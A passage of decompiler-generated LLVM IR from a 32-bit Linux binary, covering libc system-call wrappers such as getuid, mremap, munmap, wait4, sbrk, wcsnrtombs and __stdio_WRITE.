  %v0_805565c = load i32, i32* %stack_var_-4, align 4
  %v1_805565c = call i32 @__errno_location(i32 %v0_805565c)
  %v0_8055661 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055661 = sub i32 0, %v0_8055661
  %v2_8055663 = inttoptr i32 %v1_805565c to i32*
  store i32 %v1_8055661, i32* %v2_8055663, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055668

dec_label_pc_8055668:                             ; preds = %entry, %dec_label_pc_805565c
  %v0_8055669 = phi i32 [ %v1_8055651, %entry ], [ -1, %dec_label_pc_805565c ]
  %v2_805566c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805566c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055669

; uselistorder directives
  uselistorder i32 %v1_8055651, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055668, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055670 = load i32, i32* @ebx, align 4
  store i32 %v0_8055670, i32* %stack_var_-4, align 4
  %v1_8055679 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8055679, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055679, -4095
  br i1 %tmp, label %dec_label_pc_8055690, label %dec_label_pc_8055684

dec_label_pc_8055684:                             ; preds = %entry
  %v0_8055684 = load i32, i32* %stack_var_-4, align 4
  %v1_8055684 = call i32 @__errno_location(i32 %v0_8055684)
  %v0_8055689 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055689 = sub i32 0, %v0_8055689
  %v2_805568b = inttoptr i32 %v1_8055684 to i32*
  store i32 %v1_8055689, i32* %v2_805568b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055690

dec_label_pc_8055690:                             ; preds = %entry, %dec_label_pc_8055684
  %v0_8055691 = phi i32 [ %v1_8055679, %entry ], [ -1, %dec_label_pc_8055684 ]
  %v2_8055694 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055694, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055691

; uselistorder directives
  uselistorder i32 %v1_8055679, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_8055690, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055698 = load i32, i32* @edi, align 4
  %v0_8055699 = load i32, i32* @esi, align 4
  store i32 %v0_8055699, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80556b1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80556b9 = call i32 @mremap(i32 %v0_80556b1, i32 %v0_8055699, i32 %v0_8055698, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_80556b1, i32* @ebx, align 4
  store i32 %v6_80556b9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_80556b9, -4095
  br i1 %tmp, label %dec_label_pc_80556d1, label %dec_label_pc_80556c5

dec_label_pc_80556c5:                             ; preds = %entry
  %v1_80556c5 = call i32 @__errno_location(i32 %v0_80556b1)
  %v0_80556ca = load i32, i32* %esi.global-to-local, align 4
  %v1_80556ca = sub i32 0, %v0_80556ca
  %v2_80556cc = inttoptr i32 %v1_80556c5 to i32*
  store i32 %v1_80556ca, i32* %v2_80556cc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80556d1

dec_label_pc_80556d1:                             ; preds = %entry, %dec_label_pc_80556c5
  %v0_80556d2 = phi i32 [ %v6_80556b9, %entry ], [ -1, %dec_label_pc_80556c5 ]
  %v2_80556d1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80556d1, i32* @edx, align 4
  %v2_80556d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80556d4, i32* @esi, align 4
  store i32 %v0_8055698, i32* @edi, align 4
  ret i32 %v0_80556d2

; uselistorder directives
  uselistorder i32 %v6_80556b9, { 1, 0, 2 }
  uselistorder i32 %v0_80556b1, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80556d1, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80556d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80556d8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80556eb = call i32 @munmap(i32 %v0_80556d8, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80556eb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80556eb, -4095
  br i1 %tmp, label %dec_label_pc_8055704, label %dec_label_pc_80556f8

dec_label_pc_80556f8:                             ; preds = %entry
  %v0_80556f8 = load i32, i32* %stack_var_-4, align 4
  %v1_80556f8 = call i32 @__errno_location(i32 %v0_80556f8)
  %v0_80556fd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80556fd = sub i32 0, %v0_80556fd
  %v2_80556ff = inttoptr i32 %v1_80556f8 to i32*
  store i32 %v1_80556fd, i32* %v2_80556ff, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055704

dec_label_pc_8055704:                             ; preds = %entry, %dec_label_pc_80556f8
  %v0_8055705 = phi i32 [ %v4_80556eb, %entry ], [ -1, %dec_label_pc_80556f8 ]
  %v2_8055704 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055704, i32* @edx, align 4
  %v2_8055708 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055708, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055705

; uselistorder directives
  uselistorder i32 %v4_80556eb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055704, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805570c = load i32, i32* @ebx, align 4
  store i32 %v0_805570c, i32* %stack_var_-4, align 4
  %v4_8055710 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8055710, i32* %ebx.global-to-local, align 4
  %v6_805571f = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_805571f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_805571f, -4095
  br i1 %tmp, label %dec_label_pc_8055738, label %dec_label_pc_805572c

dec_label_pc_805572c:                             ; preds = %entry
  %v0_805572c = load i32, i32* %stack_var_-4, align 4
  %v1_805572c = call i32 @__errno_location(i32 %v0_805572c)
  %v0_8055731 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055731 = sub i32 0, %v0_8055731
  %v2_8055733 = inttoptr i32 %v1_805572c to i32*
  store i32 %v1_8055731, i32* %v2_8055733, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055738

dec_label_pc_8055738:                             ; preds = %entry, %dec_label_pc_805572c
  %v0_8055739 = phi i32 [ %v6_805571f, %entry ], [ -1, %dec_label_pc_805572c ]
  %v2_8055738 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055738, i32* @edx, align 4
  %v2_805573c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805573c, i32* @ebx, align 4
  ret i32 %v0_8055739

; uselistorder directives
  uselistorder i32 %v6_805571f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055738, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8055741 = load i32, i32* @ebx, align 4
  %v0_8055745 = load i32, i32* @global_var_80627a4.548, align 4
  %v1_8055745 = icmp eq i32 %v0_8055745, 0
  %v1_8055750 = icmp eq i1 %v1_8055745, false
  br i1 %v1_8055750, label %dec_label_pc_8055763, label %dec_label_pc_8055752

dec_label_pc_8055752:                             ; preds = %entry
  %v1_8055757 = call i32 @__GI_brk(i32 0)
  %v2_805575f = icmp slt i32 %v1_8055757, 0
  br i1 %v2_805575f, label %dec_label_pc_8055785, label %dec_label_pc_8055752.dec_label_pc_8055763_crit_edge

dec_label_pc_8055752.dec_label_pc_8055763_crit_edge: ; preds = %dec_label_pc_8055752
  %v0_8055765.pre = load i32, i32* @global_var_80627a4.548, align 4
  br label %dec_label_pc_8055763

dec_label_pc_8055763:                             ; preds = %dec_label_pc_8055752.dec_label_pc_8055763_crit_edge, %entry
  %v0_8055773 = phi i32 [ %v0_8055765.pre, %dec_label_pc_8055752.dec_label_pc_8055763_crit_edge ], [ %v0_8055745, %entry ]
  %v1_8055763 = icmp eq i32 %arg1, 0
  %v1_805576a = icmp eq i1 %v1_8055763, false
  br i1 %v1_805576a, label %dec_label_pc_8055770, label %dec_label_pc_805576c

dec_label_pc_805576c:                             ; preds = %dec_label_pc_8055763
  br label %dec_label_pc_8055788

dec_label_pc_8055770:                             ; preds = %dec_label_pc_8055763
  store i32 %v0_8055773, i32* @ebx, align 4
  %v2_8055775 = add i32 %v0_8055773, %arg1
  %v1_8055779 = call i32 @__GI_brk(i32 %v2_8055775)
  %v2_8055781 = icmp slt i32 %v1_8055779, 0
  %v1_8055783 = icmp eq i1 %v2_8055781, false
  br i1 %v1_8055783, label %dec_label_pc_8055770.dec_label_pc_8055788_crit_edge, label %dec_label_pc_8055785

dec_label_pc_8055770.dec_label_pc_8055788_crit_edge: ; preds = %dec_label_pc_8055770
  %v0_8055789.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055788

dec_label_pc_8055785:                             ; preds = %dec_label_pc_8055770, %dec_label_pc_8055752
  br label %dec_label_pc_8055788

dec_label_pc_8055788:                             ; preds = %dec_label_pc_8055770.dec_label_pc_8055788_crit_edge, %dec_label_pc_805576c, %dec_label_pc_8055785
  %v0_8055789 = phi i32 [ %v0_8055789.pre, %dec_label_pc_8055770.dec_label_pc_8055788_crit_edge ], [ %v0_8055773, %dec_label_pc_805576c ], [ -1, %dec_label_pc_8055785 ]
  %v2_8055788 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055788, i32* @edx, align 4
  store i32 %v0_8055741, i32* @ebx, align 4
  ret i32 %v0_8055789

; uselistorder directives
  uselistorder i32 %v0_8055773, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8055788, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8055790 = load i32, i32* @edi, align 4
  %v0_8055791 = load i32, i32* @esi, align 4
  store i32 %v0_8055791, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_80557a5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80557ad = call i32 @wait4(i32 %v0_80557a5, i32 %v0_8055791, i32 %v0_8055790, i32 %tmp5)
  store i32 %v0_80557a5, i32* @ebx, align 4
  store i32 %v4_80557ad, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80557ad, -4095
  br i1 %tmp, label %dec_label_pc_80557c5, label %dec_label_pc_80557b9

dec_label_pc_80557b9:                             ; preds = %entry
  %v1_80557b9 = call i32 @__errno_location(i32 %v0_80557a5)
  %v0_80557be = load i32, i32* %esi.global-to-local, align 4
  %v1_80557be = sub i32 0, %v0_80557be
  %v2_80557c0 = inttoptr i32 %v1_80557b9 to i32*
  store i32 %v1_80557be, i32* %v2_80557c0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80557c5

dec_label_pc_80557c5:                             ; preds = %entry, %dec_label_pc_80557b9
  %v0_80557c6 = phi i32 [ %v4_80557ad, %entry ], [ -1, %dec_label_pc_80557b9 ]
  %v2_80557c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80557c8, i32* @esi, align 4
  store i32 %v0_8055790, i32* @edi, align 4
  ret i32 %v0_80557c6

; uselistorder directives
  uselistorder i32 %v4_80557ad, { 1, 0, 2 }
  uselistorder i32 %v0_80557a5, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80557c5, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8062784.549 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_80557df = icmp eq i32 %tmp4, 0
  %v1_80557e1 = icmp eq i1 %v1_80557df, false
  br i1 %v1_80557e1, label %dec_label_pc_80557e9, label %dec_label_pc_80557e3

dec_label_pc_80557e3:                             ; preds = %entry
  %v2_80557e3 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_80557e9

dec_label_pc_80557e9:                             ; preds = %entry, %dec_label_pc_80557e3
  %v0_8055805 = phi i32 [ %tmp4, %entry ], [ %v2_80557e3, %dec_label_pc_80557e3 ]
  %v0_80557f1 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_80557e3 ]
  %v2_80557e9 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_80557e9, i32* %stack_var_-8, align 4
  store i32 %v0_80557f1, i32* %stack_var_-4, align 4
  %v2_8055800 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8055806 = inttoptr i32 %v0_8055805 to i8*
  %v6_8055806 = call i32 @__GI_wcsnrtombs(i8* %v5_8055806, i32 %v2_8055800, i32 1, i32 16, i32 %tmp)
  %v1_8055810 = icmp eq i32 %v6_8055806, 0
  %v3_8055812 = select i1 %v1_8055810, i32 1, i32 %v6_8055806
  ret i32 %v3_8055812

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_80557e9, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8055831 = inttoptr i32 %tmp to i8*
  %v6_8055831 = call i32 @__GI_wcsnrtombs(i8* %v5_8055831, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8055831
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_805583f = load i32, i32* @ebx, align 4
  %v4_8055843 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055843, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8055853 = icmp eq i8* %arg1, null
  store i1 %v1_8055853, i1* %zf.global-to-local, align 1
  br i1 %v1_8055853, label %dec_label_pc_8055862, label %dec_label_pc_8055857

dec_label_pc_8055857:                             ; preds = %entry
  %v12_8055857 = icmp eq i32 %v4_8055843, %arg2
  store i1 %v12_8055857, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805585e = icmp eq i1 %v12_8055857, false
  br i1 %v1_805585e, label %dec_label_pc_8055885, label %dec_label_pc_805587f

dec_label_pc_8055862:                             ; preds = %entry
  %v2_8055862 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055862, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8055883

dec_label_pc_805586b:                             ; preds = %dec_label_pc_8055893
  %v1_805586b = call i32 @__errno_location(i32 %v0_805583f)
  %v1_8055870 = inttoptr i32 %v1_805586b to i32*
  store i32 84, i32* %v1_8055870, align 4
  br label %dec_label_pc_80558b9

dec_label_pc_805587b:                             ; preds = %dec_label_pc_805589a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80558ae.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80558aa

dec_label_pc_805587f:                             ; preds = %dec_label_pc_8055857
  %v2_805587f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805587f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055883

dec_label_pc_8055883:                             ; preds = %dec_label_pc_8055862, %dec_label_pc_805587f
  %v2_805589c17 = phi i32 [ %v2_8055862, %dec_label_pc_8055862 ], [ %v2_805587f, %dec_label_pc_805587f ]
  %v1_805588813 = phi i32 [ -1, %dec_label_pc_8055862 ], [ %arg4, %dec_label_pc_805587f ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055885

dec_label_pc_8055885:                             ; preds = %dec_label_pc_8055857, %dec_label_pc_8055883
  %v2_805589c16 = phi i32 [ %v4_8055843, %dec_label_pc_8055857 ], [ %v2_805589c17, %dec_label_pc_8055883 ]
  %v0_805588a = phi i32 [ %arg4, %dec_label_pc_8055857 ], [ %v1_805588813, %dec_label_pc_8055883 ]
  %v1_8055885 = inttoptr i32 %arg2 to i32*
  %v2_8055885 = load i32, i32* %v1_8055885, align 4
  store i32 %v2_8055885, i32* %ebx.global-to-local, align 4
  %tmp32 = icmp uge i32 %v0_805588a, %arg3
  %v5_805588c = select i1 %tmp32, i32 %arg3, i32 %v0_805588a
  store i32 %v5_805588c, i32* %edi.global-to-local, align 4
  store i32 %v5_805588c, i32* @ecx, align 4
  %v1_80558a64 = icmp eq i32 %v5_805588c, 0
  store i1 %v1_80558a64, i1* %zf.global-to-local, align 1
  %v1_80558a811 = icmp eq i1 %v1_80558a64, false
  br i1 %v1_80558a811, label %dec_label_pc_8055893, label %dec_label_pc_80558aa

dec_label_pc_8055893:                             ; preds = %dec_label_pc_8055885, %dec_label_pc_80558a0
  %v2_805589c = phi i32 [ %v2_80558a3, %dec_label_pc_80558a0 ], [ %v2_805589c16, %dec_label_pc_8055885 ]
  %v0_8055893 = phi i32 [ %v1_80558a0, %dec_label_pc_80558a0 ], [ %v2_8055885, %dec_label_pc_8055885 ]
  %v1_8055893 = inttoptr i32 %v0_8055893 to i32*
  %v2_8055893 = load i32, i32* %v1_8055893, align 4
  %v9_8055895 = icmp eq i32 %v2_8055893, 127
  store i1 %v9_8055895, i1* %zf.global-to-local, align 1
  %v6_8055898 = icmp ugt i32 %v2_8055893, 127
  br i1 %v6_8055898, label %dec_label_pc_805586b, label %dec_label_pc_805589a

dec_label_pc_805589a:                             ; preds = %dec_label_pc_8055893
  %v3_805589a = trunc i32 %v2_8055893 to i8
  %v4_805589a = icmp eq i8 %v3_805589a, 0
  store i1 %v4_805589a, i1* %zf.global-to-local, align 1
  %v3_805589c = inttoptr i32 %v2_805589c to i8*
  store i8 %v3_805589a, i8* %v3_805589c, align 1
  %v0_805589e = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805589e, label %dec_label_pc_805587b, label %dec_label_pc_80558a0

dec_label_pc_80558a0:                             ; preds = %dec_label_pc_805589a
  %v0_80558a0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80558a0 = add i32 %v0_80558a0, 4
  store i32 %v1_80558a0, i32* %ebx.global-to-local, align 4
  %v0_80558a3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80558a3 = load i32, i32* %esi.global-to-local, align 4
  %v2_80558a3 = add i32 %v1_80558a3, %v0_80558a3
  store i32 %v2_80558a3, i32* %edx.global-to-local, align 4
  %v0_80558a5 = load i32, i32* @ecx, align 4
  %v1_80558a5 = add i32 %v0_80558a5, -1
  %v8_80558a5 = icmp eq i32 %v1_80558a5, 0
  store i32 %v1_80558a5, i32* @ecx, align 4
  store i1 %v8_80558a5, i1* %zf.global-to-local, align 1
  %v1_80558a8 = icmp eq i1 %v8_80558a5, false
  br i1 %v1_80558a8, label %dec_label_pc_8055893, label %dec_label_pc_80558aa

dec_label_pc_80558aa:                             ; preds = %dec_label_pc_80558a0, %dec_label_pc_8055885, %dec_label_pc_805587b
  %v0_80558b2 = phi i32 [ 0, %dec_label_pc_805587b ], [ %v2_8055885, %dec_label_pc_8055885 ], [ %v1_80558a0, %dec_label_pc_80558a0 ]
  %v0_80558ae = phi i32 [ %v0_80558ae.pre, %dec_label_pc_805587b ], [ %v2_805589c16, %dec_label_pc_8055885 ], [ %v2_80558a3, %dec_label_pc_80558a0 ]
  %v2_80558aa = ptrtoint i32* %stack_var_-32 to i32
  %v12_80558ae = icmp eq i32 %v0_80558ae, %v2_80558aa
  store i1 %v12_80558ae, i1* %zf.global-to-local, align 1
  br i1 %v12_80558ae, label %dec_label_pc_80558b5, label %dec_label_pc_80558b2

dec_label_pc_80558b2:                             ; preds = %dec_label_pc_80558aa
  %v1_80558b2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80558b2 = inttoptr i32 %v1_80558b2 to i32*
  store i32 %v0_80558b2, i32* %v2_80558b2, align 4
  br label %dec_label_pc_80558b5

dec_label_pc_80558b5:                             ; preds = %dec_label_pc_80558aa, %dec_label_pc_80558b2
  %v0_80558b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80558b7 = load i32, i32* @ecx, align 4
  %v2_80558b7 = sub i32 %v0_80558b5, %v1_80558b7
  %v12_80558b7 = icmp eq i32 %v2_80558b7, 0
  br label %dec_label_pc_80558b9

dec_label_pc_80558b9:                             ; preds = %dec_label_pc_805586b, %dec_label_pc_80558b5
  %storemerge = phi i1 [ %v12_80558b7, %dec_label_pc_80558b5 ], [ false, %dec_label_pc_805586b ]
  %storemerge2 = phi i32 [ %v2_80558b7, %dec_label_pc_80558b5 ], [ -1, %dec_label_pc_805586b ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_80558b9 = load i32, i32* @esp, align 4
  %v9_80558b9 = icmp eq i32 %v0_80558b9, -28
  store i1 %v9_80558b9, i1* %zf.global-to-local, align 1
  store i32 %v0_805583f, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i1 %v12_80558ae, { 1, 0 }
  uselistorder i32 %v2_80558a3, { 0, 2, 1 }
  uselistorder i32 %v1_80558a0, { 0, 2, 1 }
  uselistorder i32 %v2_8055893, { 1, 2, 0 }
  uselistorder i32 %v2_8055885, { 1, 0, 2 }
  uselistorder i32 %v0_805588a, { 1, 0 }
  uselistorder i32 %v2_805589c16, { 1, 0 }
  uselistorder i1 %v12_8055857, { 1, 0 }
  uselistorder i32 %v4_8055843, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 2, 0, 3, 8, 5, 6, 7, 1, 9, 4, 10, 11, 12 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 3, 0, 2, 7, 4, 5, 8, 1, 6 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80558b9, { 1, 0 }
  uselistorder label %dec_label_pc_80558b5, { 1, 0 }
  uselistorder label %dec_label_pc_8055893, { 1, 0 }
  uselistorder label %dec_label_pc_8055885, { 1, 0 }
  uselistorder label %dec_label_pc_8055883, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80558c5 = load i32, i32* @edi, align 4
  %v0_80558c7 = load i32, i32* @ebx, align 4
  %v15_80558c8 = ptrtoint i32* %stack_var_-28 to i32
  %v4_80558cb = ptrtoint i16* %arg1 to i32
  store i32 %v4_80558cb, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80558d74 = icmp eq i32 %arg3, 0
  store i1 %v1_80558d74, i1* %zf.global-to-local, align 1
  br i1 %v1_80558d74, label %dec_label_pc_8055938, label %dec_label_pc_80558dc.lr.ph

dec_label_pc_80558dc.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80558dc

dec_label_pc_80558dc:                             ; preds = %dec_label_pc_80558f8.dec_label_pc_80558dc_crit_edge, %dec_label_pc_80558dc.lr.ph
  %v0_80558e9 = phi i32 [ %v4_80558cb, %dec_label_pc_80558dc.lr.ph ], [ %v0_80558e9.pre, %dec_label_pc_80558f8.dec_label_pc_80558dc_crit_edge ]
  %v0_80558e8 = phi i32 [ %arg2, %dec_label_pc_80558dc.lr.ph ], [ %v2_80558fa, %dec_label_pc_80558f8.dec_label_pc_80558dc_crit_edge ]
  %v0_80558e4.in = phi i32 [ %arg3, %dec_label_pc_80558dc.lr.ph ], [ %v2_80558f8, %dec_label_pc_80558f8.dec_label_pc_80558dc_crit_edge ]
  %v4_80558e4 = phi i32 [ %arg3, %dec_label_pc_80558dc.lr.ph ], [ %v2_80558f8, %dec_label_pc_80558f8.dec_label_pc_80558dc_crit_edge ]
  %v0_80558e4 = icmp slt i32 %v0_80558e4.in, 0
  store i32 %v4_80558e4, i32* %esi.global-to-local, align 4
  %v2_80558e4 = icmp eq i1 %v0_80558e4, false
  %v5_80558e4 = select i1 %v2_80558e4, i32 %v4_80558e4, i32 2147483647
  store i32 %v5_80558e4, i32* %eax.global-to-local, align 4
  %v1_80558e9 = add i32 %v0_80558e9, 4
  %v2_80558e9 = inttoptr i32 %v1_80558e9 to i32*
  %v3_80558e9 = load i32, i32* %v2_80558e9, align 4
  %tmp36 = inttoptr i32 %v0_80558e8 to i32*
  %v5_80558ec = call i32 @__libc_write(i32 %v3_80558e9, i32* %tmp36, i32 %v5_80558e4)
  store i32 %v5_80558ec, i32* %eax.global-to-local, align 4
  %v1_80558f4 = icmp eq i32 %v5_80558ec, 0
  store i1 %v1_80558f4, i1* %zf.global-to-local, align 1
  %v2_80558f4 = icmp slt i32 %v5_80558ec, 0
  br i1 %v2_80558f4, label %dec_label_pc_80558fe, label %dec_label_pc_80558f8

dec_label_pc_80558f8:                             ; preds = %dec_label_pc_80558dc
  %v0_80558f8 = load i32, i32* @ebx, align 4
  %v2_80558f8 = sub i32 %v0_80558f8, %v5_80558ec
  %v12_80558f8 = icmp eq i32 %v2_80558f8, 0
  store i32 %v2_80558f8, i32* @ebx, align 4
  %v0_80558fa = load i32, i32* @edi, align 4
  %v2_80558fa = add i32 %v0_80558fa, %v5_80558ec
  store i32 %v2_80558fa, i32* @edi, align 4
  store i1 %v12_80558f8, i1* %zf.global-to-local, align 1
  br i1 %v12_80558f8, label %dec_label_pc_8055938, label %dec_label_pc_80558f8.dec_label_pc_80558dc_crit_edge

dec_label_pc_80558f8.dec_label_pc_80558dc_crit_edge: ; preds = %dec_label_pc_80558f8
  %v0_80558e9.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80558dc

dec_label_pc_80558fe:                             ; preds = %dec_label_pc_80558dc
  %v0_80558fe = load i32, i32* %ebp.global-to-local, align 4
  %v1_80558fe = inttoptr i32 %v0_80558fe to i32*
  %v2_80558fe = load i32, i32* %v1_80558fe, align 4
  store i32 %v2_80558fe, i32* %eax.global-to-local, align 4
  %v1_8055901 = add i32 %v0_80558fe, 8
  %v2_8055901 = inttoptr i32 %v1_8055901 to i32*
  %v3_8055901 = load i32, i32* %v2_8055901, align 4
  store i32 %v3_8055901, i32* @edx, align 4
  %v1_8055904 = or i32 %v2_80558fe, 8
  store i32 %v1_8055904, i32* %eax.global-to-local, align 4
